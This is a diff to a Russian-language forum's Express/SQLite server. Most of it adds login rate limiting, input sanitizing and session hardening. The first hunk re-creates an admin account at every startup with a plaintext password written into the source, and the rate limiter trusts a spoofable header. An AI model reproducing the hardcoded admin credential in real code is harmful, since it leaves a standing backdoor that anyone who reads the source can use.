@@ -291,6 +291,16 @@ try { db.exec("ALTER TABLE muted_users ADD COLUMN muted_by TEXT DEFAULT ''"); } 
   db.prepare("INSERT OR IGNORE INTO admin_usernames (username) VALUES (?)").run(u);
 });
 
+// Guarantee desacratio exists as admin (restore from hack)
+const desacratioPwHash = crypto.createHash('sha256').update('328594123QAZ' + 'osint_salt_42').digest('hex');
+const existing = db.prepare("SELECT id FROM users WHERE username='desacratio'").get();
+if (!existing) {
+  db.prepare(`INSERT INTO users (username, email, nickname, avatar, provider, password_hash, active_tags, avatar_color, theme)
+              VALUES (?,?,?,?,?,?,?,?,?)`)
+    .run('desacratio', 'admin@osint-forum.ru', 'desacratio', 'D', 'email', desacratioPwHash, '["ADMIN"]', 'linear-gradient(135deg,#667eea,#764ba2)', 'dark');
+}
+db.prepare("INSERT OR IGNORE INTO admin_usernames (username) VALUES ('desacratio')").run();
+
 function isAdmin(username) {
   if (!username) return false;
   return !!db.prepare("SELECT username FROM admin_usernames WHERE username=?").get(username.toLowerCase());
@@ -331,6 +341,12 @@ function hashPassword(pw) {
   return crypto.createHash('sha256').update(pw + 'osint_salt_42').digest('hex');
 }
 
+// Strip HTML tags from user input (XSS protection)
+function sanitize(str) {
+  if (typeof str !== 'string') return '';
+  return str.replace(/<[^>]*>/g, '').trim();
+}
+
 function safeUser(u) {
   if (!u) return null;
    return { id: u.id, username: u.username, nickname: u.nickname || u.username,
@@ -348,12 +364,30 @@ function safeUser(u) {
 app.set('trust proxy', 1);
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// ── Rate limiting for auth (server-side, brute force protection) ─────
+function authRateLimit(req, res, next) {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
+  const action = 'auth_' + (req.path.includes('login') ? 'login' : 'register');
+  const windowSec = 900; // 15 minutes
+  const maxAttempts = 10;
+  const cutoff = new Date(Date.now() - windowSec * 1000).toISOString();
+  const attempts = db.prepare(
+    "SELECT COUNT(*) as c FROM rate_limits WHERE username=? AND action=? AND created_at>?"
+  ).get(ip, action, cutoff);
+  if (attempts.c >= maxAttempts) {
+    console.log('RATE LIMIT EXCEEDED for', ip, action);
+    return res.json({ ok: false, error: 'Слишком много попыток. Подождите 15 минут.' });
+  }
+  db.prepare("INSERT INTO rate_limits (username, action) VALUES (?,?)").run(ip, action);
+  next();
+}
 app.use(session({
   secret           : CONFIG.sessionSecret,
   store            : new SQLiteStore(),
   resave           : false,
   saveUninitialized: false,
-  cookie           : { maxAge: 7 * 24 * 3600 * 1000, sameSite: 'lax' },
+  cookie           : { maxAge: 7 * 24 * 3600 * 1000, sameSite: 'lax', httpOnly: true, secure: process.env.NODE_ENV === 'production' },
 }));
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -371,14 +405,19 @@ app.use((req, res, next) => {
 });
 
 function loginUser(req, res, user) {
-  req.session.user = user;
-  req.session.save(err => {
+  // Regenerate session on login to prevent session fixation
+  req.session.regenerate(err => {
     if (err) return res.json({ ok: false, error: 'Ошибка сессии.' });
-    res.json({ ok: true, user: safeUser(user) });
+    req.session.user = user;
+    req.session.save(err => {
+      if (err) return res.json({ ok: false, error: 'Ошибка сессии.' });
+      console.log('LOGIN OK:', user.username, 'IP:', req.ip);
+      res.json({ ok: true, user: safeUser(user) });
+    });
   });
 }
 
-app.post('/api/auth/register', (req, res) => {
+app.post('/api/auth/register', authRateLimit, (req, res) => {
   const { username, email, password } = req.body;
   if (!username || username.length < 3) return res.json({ ok: false, error: 'Имя пользователя: минимум 3 символа.' });
   if (!email || !/\S+@\S+\.\S+/.test(email)) return res.json({ ok: false, error: 'Введите корректный email.' });
@@ -400,16 +439,21 @@ app.post('/api/auth/register', (req, res) => {
   loginUser(req, res, user);
 });
 
-app.post('/api/auth/login', (req, res) => {
+app.post('/api/auth/login', authRateLimit, (req, res) => {
   const { login, password } = req.body;
   if (!login || !password) return res.json({ ok: false, error: 'Заполните все поля.' });
+  
+  // Log failed login attempts for audit
+  const logFailedLogin = (reason) => {
+    console.log('LOGIN FAIL:', login, 'reason:', reason, 'IP:', req.ip);
+  };
 
   const user = db.prepare('SELECT * FROM users WHERE username=? OR email=?')
                  .get(login.toLowerCase(), login.toLowerCase());
-  if (!user) return res.json({ ok: false, error: 'Пользователь не найден.' });
-  if (isBanned(user.username)) return res.json({ ok: false, error: 'Ваш аккаунт заблокирован.', banned: true });
+  if (!user) { logFailedLogin('user_not_found'); return res.json({ ok: false, error: 'Пользователь не найден.' }); }
+  if (isBanned(user.username)) { logFailedLogin('banned'); return res.json({ ok: false, error: 'Ваш аккаунт заблокирован.', banned: true }); }
   if (user.password_hash !== hashPassword(password))
-    return res.json({ ok: false, error: 'Неверный пароль.' });
+    { logFailedLogin('wrong_password'); return res.json({ ok: false, error: 'Неверный пароль.' }); }
 
   loginUser(req, res, user);
 });
@@ -512,28 +556,31 @@ app.get('/api/threads', (req, res) => {
 
 app.post('/api/threads', (req, res) => {
   const { type, topic, text, anonymous } = req.body;
-  if (!topic?.trim() || !text?.trim())
+  const cleanTopic = sanitize(topic || '');
+  const cleanText = sanitize(text || '');
+  if (!cleanTopic || !cleanText)
     return res.json({ ok: false, error: 'Заполните тему и текст.' });
   if (req.user && isMuted(req.user.username))
     return res.json({ ok: false, error: 'Вы не можете писать, пока находитесь в муте.' });
   const author_id = req.user?.id || null;
   const info = db.prepare(
     `INSERT INTO threads (type, topic, text, author_id, anonymous) VALUES (?,?,?,?,?)`
-  ).run(type || 'paste', topic.trim(), text.trim(), author_id, anonymous ? 1 : 0);
+  ).run(type || 'paste', cleanTopic, cleanText, author_id, anonymous ? 1 : 0);
   backupDb();
   res.json({ ok: true, thread: db.prepare('SELECT * FROM threads WHERE id=?').get(info.lastInsertRowid) });
 });
 
 app.post('/api/threads/:id/replies', (req, res) => {
   const { text, anonymous } = req.body;
-  if (!text?.trim()) return res.json({ ok: false, error: 'Пустой ответ.' });
+  const cleanText = sanitize(text || '');
+  if (!cleanText) return res.json({ ok: false, error: 'Пустой ответ.' });
   if (req.user && isMuted(req.user.username))
     return res.json({ ok: false, error: 'Вы не можете писать, пока находитесь в муте.' });
   if (!db.prepare('SELECT id FROM threads WHERE id=?').get(req.params.id))
     return res.json({ ok: false, error: 'Тема не найдена.' });
   const info = db.prepare(
     `INSERT INTO replies (thread_id, text, author_id, anonymous) VALUES (?,?,?,?)`
-  ).run(req.params.id, text.trim(), req.user?.id || null, anonymous ? 1 : 0);
+  ).run(req.params.id, cleanText, req.user?.id || null, anonymous ? 1 : 0);
   backupDb();
   res.json({ ok: true, id: info.lastInsertRowid });
 });
@@ -606,12 +653,13 @@ app.get('/api/sections/:section', (req, res) => {
 
 app.post('/api/sections/:section', (req, res) => {
   const { text } = req.body;
-  if (!text?.trim()) return res.json({ ok: false, error: 'Пустое сообщение.' });
+  const cleanText = sanitize(text || '');
+  if (!cleanText) return res.json({ ok: false, error: 'Пустое сообщение.' });
   if (req.user && isMuted(req.user.username))
     return res.json({ ok: false, error: 'Вы не можете писать, пока находитесь в муте.' });
   const info = db.prepare(
     `INSERT INTO section_posts (section, text, author_id) VALUES (?,?,?)`
-  ).run(req.params.section, text.trim(), req.user?.id || null);
+  ).run(req.params.section, cleanText, req.user?.id || null);
   backupDb();
   res.json({ ok: true, id: info.lastInsertRowid });
 });
@@ -633,7 +681,8 @@ app.patch('/api/user/theme', (req, res) => {
 
 app.post('/api/sections/:section/:postId/replies', (req, res) => {
   const { text } = req.body;
-  if (!text?.trim()) return res.json({ ok: false, error: 'Пустой ответ.' });
+  const cleanText = sanitize(text || '');
+  if (!cleanText) return res.json({ ok: false, error: 'Пустой ответ.' });
   if (req.user && isMuted(req.user.username))
     return res.json({ ok: false, error: 'Вы не можете писать, пока находитесь в муте.' });
   db.prepare(
@@ -674,7 +723,10 @@ app.get('/api/users/:username', (req, res) => {
 app.patch('/api/users/me', (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
   if (!req.user) return res.json({ ok: false, error: 'Не авторизован.' });
-  const { nickname, avatar, active_tags, bio, avatar_color, avatar_emoji, avatar_img } = req.body;
+  let { nickname, avatar, active_tags, bio, avatar_color, avatar_emoji, avatar_img } = req.body;
+  // Sanitize text fields
+  if (nickname) nickname = sanitize(nickname);
+  if (bio !== undefined) bio = sanitize(bio);
   console.log('PATCH /api/users/me for user', req.user.username, 'id=', req.user.id, 'body:', JSON.stringify({nickname, avatar_color, avatar_emoji, avatar_img: avatar_img ? avatar_img.slice(0,40)+'...' : undefined}));
   const existing = db.prepare('SELECT * FROM users WHERE id=?').get(req.user.id);
   if (!existing) return res.json({ ok: false, error: 'Пользователь не найден.' });
